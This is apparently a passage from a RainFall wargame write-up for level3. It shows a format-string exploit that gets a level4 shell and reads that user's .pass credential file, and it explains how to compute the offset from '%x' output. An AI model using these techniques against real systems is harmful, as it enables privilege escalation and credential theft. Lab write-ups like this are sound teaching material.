Execute the payload.sh file to enter the shell of level4 user:

```sh
level3@RainFall:~$ /tmp/offset.sh
�200 b7fd1ac0 b7ff37d0 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Wait what?!
whoami
level4
cat /home/user/level4/.pass            
b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
```

If it doesn't work and just print the first line without the "Wait What ?!" message, then it means that the buffer size probably changed (it can happen the stacks changes a lot even if it is not supposed to on RainFall), in this case you can launch level3 and print a bunch of "%x" to know the offset necessary to access the buffer memory space, then execute payload.sh with a custom offset value as such:

```sh
level3@RainFall:~$ ./level3 
AAAA %x %x %x %x %x %x
AAAA 200 b7fd1ac0 b7ff37d0 41414141 20782520 25207825
level3@RainFall:~$ /tmp/
level3@RainFall:~$ /tmp/offset.sh 38
�200 b7fd1ac0 b7ff37d0 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Wait what?!
[...]
```

Here we count everything after the AAAA and stop before the 41414141 so 22 chars, with the address of m 26, so 64 - 26 = 38.
